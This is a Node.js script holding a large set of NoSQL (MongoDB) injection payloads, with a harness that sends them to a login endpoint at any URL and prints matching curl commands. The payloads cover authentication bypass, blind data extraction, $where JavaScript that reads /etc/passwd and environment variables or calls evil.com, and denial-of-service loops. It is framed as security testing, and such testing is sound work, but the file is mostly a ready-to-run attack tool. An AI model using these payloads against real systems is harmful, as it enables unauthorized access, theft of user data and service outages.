#!/usr/bin/env node
'use strict';

/**
 * Complete NoSQL Injection Payloads Collection
 * All possible NoSQL injection techniques for testing
 */

const axios = require('axios');

class CompleteNoSQLInjectionTester {
    constructor(baseUrl = 'http://localhost:3000') {
        this.baseUrl = baseUrl;
        this.results = [];
    }

    /**
     * All NoSQL Injection Payloads
     */
    getAllPayloads() {
        return {
            // 1. AUTHENTICATION BYPASS PAYLOADS
            authenticationBypass: [
                {
                    name: "Basic $ne (Not Equal) Injection",
                    userAddress: { "$ne": null },
                    password: { "$ne": null },
                    description: "Returns first user where email/username is not null"
                },
                {
                    name: "Empty String $ne Injection",
                    userAddress: { "$ne": "" },
                    password: { "$ne": "" },
                    description: "Returns first user where email/username is not empty"
                },
                {
                    name: "Regex Wildcard Injection",
                    userAddress: { "$regex": ".*" },
                    password: { "$regex": ".*" },
                    description: "Matches any email/username and password"
                },
                {
                    name: "Exists True Injection",
                    userAddress: { "$exists": true },
                    password: { "$exists": true },
                    description: "Returns first user where email/username field exists"
                },
                {
                    name: "Greater Than Empty String",
                    userAddress: { "$gt": "" },
                    password: { "$gt": "" },
                    description: "Returns first user where email/username > empty string"
                },
                {
                    name: "Greater Than or Equal",
                    userAddress: { "$gte": "" },
                    password: { "$gte": "" },
                    description: "Returns first user where email/username >= empty string"
                },
                {
                    name: "Less Than High Value",
                    userAddress: { "$lt": "zzzzz" },
                    password: { "$lt": "zzzzz" },
                    description: "Returns first user where email/username < zzzzz"
                },
                {
                    name: "In Array Injection",
                    userAddress: { "$in": ["admin", "user", "test", ""] },
                    password: { "$ne": null },
                    description: "Checks if email/username is in common values array"
                },
                {
                    name: "Not In Array Injection",
                    userAddress: { "$nin": ["nonexistent"] },
                    password: { "$nin": ["nonexistent"] },
                    description: "Returns users not in nonexistent array"
                },
                {
                    name: "OR Operator Injection",
                    userAddress: { "$or": [{"$ne": null}, {"$exists": true}] },
                    password: "anything",
                    description: "Uses OR logic to bypass authentication"
                },
                {
                    name: "AND Operator Injection",
                    userAddress: { "$and": [{"$ne": null}, {"$exists": true}] },
                    password: { "$ne": null },
                    description: "Uses AND logic with multiple conditions"
                },
                {
                    name: "NOR Operator Injection",
                    userAddress: { "$nor": [{"$eq": "nonexistent"}] },
                    password: { "$ne": null },
                    description: "Uses NOR logic to find existing users"
                },
                {
                    name: "NOT Operator Injection",
                    userAddress: { "$not": { "$eq": "nonexistent" } },
                    password: { "$ne": null },
                    description: "Uses NOT logic to bypass checks"
                }
            ],

            // 2. WHERE CLAUSE INJECTIONS
            whereClauseInjections: [
                {
                    name: "Basic Where Clause",
                    userAddress: { "$where": "this.email" },
                    password: "anything",
                    description: "Executes JavaScript in where clause"
                },
                {
                    name: "Where with Return True",
                    userAddress: { "$where": "function() { return true; }" },
                    password: "anything",
                    description: "Always returns true via JavaScript function"
                },
                {
                    name: "Where with Sleep (DoS)",
                    userAddress: { "$where": "sleep(5000) || true" },
                    password: "anything",
                    description: "Causes 5-second delay for DoS attack"
                },
                {
                    name: "Where with Email Length Check",
                    userAddress: { "$where": "this.email.length > 0" },
                    password: "anything",
                    description: "Checks if email field has content"
                },
                {
                    name: "Where with Password Access",
                    userAddress: { "$where": "this.password" },
                    password: "anything",
                    description: "Attempts to access password field"
                },
                {
                    name: "Where with Admin Check",
                    userAddress: { "$where": "this.email.indexOf('admin') >= 0" },
                    password: "anything",
                    description: "Finds users with 'admin' in email"
                },
                {
                    name: "Where with Role Check",
                    userAddress: { "$where": "this.role == 'admin'" },
                    password: "anything",
                    description: "Finds admin role users"
                },
                {
                    name: "Where with Object Keys",
                    userAddress: { "$where": "Object.keys(this).length > 5" },
                    password: "anything",
                    description: "Finds users with many fields"
                }
            ],

            // 3. REGEX INJECTIONS
            regexInjections: [
                {
                    name: "Regex Match All",
                    userAddress: { "$regex": ".*" },
                    password: "test",
                    description: "Matches any email/username"
                },
                {
                    name: "Regex Case Insensitive",
                    userAddress: { "$regex": "admin", "$options": "i" },
                    password: "test",
                    description: "Case-insensitive search for admin"
                },
                {
                    name: "Regex Start with A",
                    userAddress: { "$regex": "^a" },
                    password: "test",
                    description: "Finds emails/usernames starting with 'a'"
                },
                {
                    name: "Regex Email Pattern",
                    userAddress: { "$regex": ".*@.*" },
                    password: "test",
                    description: "Finds all email addresses"
                },
                {
                    name: "Regex Gmail Users",
                    userAddress: { "$regex": ".*@gmail.com" },
                    password: "test",
                    description: "Finds all Gmail users"
                },
                {
                    name: "Regex Admin Pattern",
                    userAddress: { "$regex": ".*(admin|root|superuser).*", "$options": "i" },
                    password: "test",
                    description: "Finds admin-like usernames"
                },
                {
                    name: "Regex Number Pattern",
                    userAddress: { "$regex": ".*[0-9].*" },
                    password: "test",
                    description: "Finds usernames with numbers"
                },
                {
                    name: "Regex Special Characters",
                    userAddress: { "$regex": ".*[!@#$%^&*].*" },
                    password: "test",
                    description: "Finds usernames with special characters"
                }
            ],

            // 4. TYPE CONFUSION ATTACKS
            typeConfusion: [
                {
                    name: "Array Instead of String",
                    userAddress: ["admin", "user", "test"],
                    password: "test",
                    description: "Sends array instead of string"
                },
                {
                    name: "Number Instead of String",
                    userAddress: 123456,
                    password: 123456,
                    description: "Sends number instead of string"
                },
                {
                    name: "Boolean Instead of String",
                    userAddress: true,
                    password: true,
                    description: "Sends boolean instead of string"
                },
                {
                    name: "Null Values",
                    userAddress: null,
                    password: null,
                    description: "Sends null values"
                },
                {
                    name: "Undefined Values",
                    userAddress: undefined,
                    password: undefined,
                    description: "Sends undefined values"
                }
            ],

            // 5. BLIND NOSQL INJECTIONS
            blindInjections: [
                {
                    name: "Blind - Email Length 5",
                    userAddress: { "$where": "this.email.length == 5" },
                    password: "test",
                    description: "Tests if any user has 5-character email"
                },
                {
                    name: "Blind - Email Length 10",
                    userAddress: { "$where": "this.email.length == 10" },
                    password: "test",
                    description: "Tests if any user has 10-character email"
                },
                {
                    name: "Blind - Email Starts with A",
                    userAddress: { "$where": "this.email.charAt(0) == 'a'" },
                    password: "test",
                    description: "Tests if any email starts with 'a'"
                },
                {
                    name: "Blind - Password Length Check",
                    userAddress: { "$where": "this.password.length > 8" },
                    password: "test",
                    description: "Tests if any user has password > 8 chars"
                },
                {
                    name: "Blind - User Count",
                    userAddress: { "$where": "db.users.count() > 0" },
                    password: "test",
                    description: "Tests if users collection has records"
                }
            ],

            // 6. ADVANCED JAVASCRIPT INJECTIONS
            advancedJavaScript: [
                {
                    name: "JavaScript - Global Access",
                    userAddress: { "$where": "global.process" },
                    password: "test",
                    description: "Attempts to access global process object"
                },
                {
                    name: "JavaScript - Require Function",
                    userAddress: { "$where": "require('fs')" },
                    password: "test",
                    description: "Attempts to require filesystem module"
                },
                {
                    name: "JavaScript - Process Exit",
                    userAddress: { "$where": "process.exit()" },
                    password: "test",
                    description: "Attempts to exit the process"
                },
                {
                    name: "JavaScript - File System Access",
                    userAddress: { "$where": "require('fs').readFileSync('/etc/passwd')" },
                    password: "test",
                    description: "Attempts to read system files"
                },
                {
                    name: "JavaScript - Network Request",
                    userAddress: { "$where": "require('http').get('http://evil.com')" },
                    password: "test",
                    description: "Attempts to make external HTTP request"
                },
                {
                    name: "JavaScript - Environment Variables",
                    userAddress: { "$where": "process.env" },
                    password: "test",
                    description: "Attempts to access environment variables"
                }
            ],

            // 7. TIMING ATTACKS
            timingAttacks: [
                {
                    name: "Sleep 1 Second",
                    userAddress: { "$where": "sleep(1000) || true" },
                    password: "test",
                    description: "1-second delay for timing analysis"
                },
                {
                    name: "Sleep 5 Seconds",
                    userAddress: { "$where": "sleep(5000) || true" },
                    password: "test",
                    description: "5-second delay for DoS"
                },
                {
                    name: "Infinite Loop",
                    userAddress: { "$where": "while(true){}" },
                    password: "test",
                    description: "Infinite loop to crash server"
                },
                {
                    name: "Heavy Computation",
                    userAddress: { "$where": "for(var i=0;i<1000000;i++){Math.random()}" },
                    password: "test",
                    description: "Heavy computation for DoS"
                }
            ],

            // 8. DATA EXTRACTION TECHNIQUES
            dataExtraction: [
                {
                    name: "Extract All Emails",
                    userAddress: { "$where": "this.email.indexOf('@') > 0" },
                    password: "test",
                    description: "Finds all users with email addresses"
                },
                {
                    name: "Extract Admin Users",
                    userAddress: { "$where": "this.role == 'admin' || this.is_admin == true" },
                    password: "test",
                    description: "Finds admin users"
                },
                {
                    name: "Extract Users with Wallet",
                    userAddress: { "$where": "this.wallet > 0" },
                    password: "test",
                    description: "Finds users with money in wallet"
                },
                {
                    name: "Extract Verified Users",
                    userAddress: { "$where": "this.email_verified == true" },
                    password: "test",
                    description: "Finds verified users"
                },
                {
                    name: "Extract Recent Users",
                    userAddress: { "$where": "this.created_at > new Date('2024-01-01')" },
                    password: "test",
                    description: "Finds recently created users"
                }
            ]
        };
    }

    /**
     * Test all payloads against login endpoint
     */
    async testAllPayloads() {
        console.log('🚀 Testing ALL NoSQL Injection Payloads\n');
        
        const allPayloads = this.getAllPayloads();
        let totalTests = 0;
        let vulnerableTests = 0;

        for (const [category, payloads] of Object.entries(allPayloads)) {
            console.log(`\n📂 Testing ${category.toUpperCase()}:`);
            console.log('='.repeat(50));

            for (const payload of payloads) {
                totalTests++;
                const result = await this.testSinglePayload(payload);
                
                if (result.vulnerable) {
                    vulnerableTests++;
                    console.log(`✅ VULNERABLE: ${payload.name}`.red);
                    console.log(`   Description: ${payload.description}`);
                    console.log(`   Payload: ${JSON.stringify(payload, null, 2)}`);
                } else {
                    console.log(`❌ Protected: ${payload.name}`.green);
                }
            }
        }

        console.log(`\n📊 SUMMARY:`);
        console.log(`Total Tests: ${totalTests}`);
        console.log(`Vulnerable: ${vulnerableTests}`);
        console.log(`Protected: ${totalTests - vulnerableTests}`);
        console.log(`Vulnerability Rate: ${((vulnerableTests/totalTests)*100).toFixed(1)}%`);
    }

    /**
     * Test single payload
     */
    async testSinglePayload(payload) {
        const startTime = Date.now();
        
        try {
            const response = await axios({
                method: 'POST',
                url: `${this.baseUrl}/api/user/login`,
                data: {
                    userAddress: payload.userAddress,
                    password: payload.password
                },
                timeout: 10000,
                headers: {
                    'Content-Type': 'application/json'
                }
            });

            const responseTime = Date.now() - startTime;
            
            // Check if authentication was bypassed
            if (response.status === 200 && response.data.status === true) {
                return {
                    vulnerable: true,
                    type: 'Authentication Bypass',
                    response: response.data,
                    responseTime
                };
            }

            // Check for timing attacks
            if (responseTime > 3000) {
                return {
                    vulnerable: true,
                    type: 'Timing Attack / DoS',
                    responseTime
                };
            }

            return { vulnerable: false, responseTime };

        } catch (error) {
            const responseTime = Date.now() - startTime;
            
            // Check for timing attacks even on errors
            if (responseTime > 3000) {
                return {
                    vulnerable: true,
                    type: 'Timing Attack / DoS',
                    responseTime,
                    error: error.message
                };
            }

            // Check for different error messages (user enumeration)
            if (error.response && error.response.data && 
                error.response.data.message && 
                error.response.data.message !== "Invalid Credentials!") {
                return {
                    vulnerable: true,
                    type: 'User Enumeration',
                    errorMessage: error.response.data.message
                };
            }

            return { 
                vulnerable: false, 
                responseTime,
                error: error.message 
            };
        }
    }

    /**
     * Generate curl commands for manual testing
     */
    generateCurlCommands() {
        const allPayloads = this.getAllPayloads();
        const curlCommands = [];

        for (const [category, payloads] of Object.entries(allPayloads)) {
            curlCommands.push(`\n# ${category.toUpperCase()} ATTACKS`);
            
            payloads.forEach((payload, index) => {
                const curlCommand = `curl -X POST ${this.baseUrl}/api/user/login \\
  -H "Content-Type: application/json" \\
  -d '${JSON.stringify({
    userAddress: payload.userAddress,
    password: payload.password
  })}' \\
  --max-time 10`;
                
                curlCommands.push(`\n# ${payload.name}`);
                curlCommands.push(`# ${payload.description}`);
                curlCommands.push(curlCommand);
            });
        }

        return curlCommands.join('\n');
    }
}

// Export for use in other modules
module.exports = CompleteNoSQLInjectionTester;

// CLI execution
if (require.main === module) {
    const args = process.argv.slice(2);
    const baseUrl = args.find(arg => arg.startsWith('--url='))?.split('=')[1] || 'http://localhost:3000';
    const generateCurl = args.includes('--curl');
    
    const tester = new CompleteNoSQLInjectionTester(baseUrl);
    
    if (generateCurl) {
        console.log('📋 CURL COMMANDS FOR MANUAL TESTING:');
        console.log(tester.generateCurlCommands());
    } else {
        tester.testAllPayloads()
            .then(() => console.log('\n✅ All tests completed'))
            .catch(error => console.error('❌ Testing failed:', error.message));
    }
}
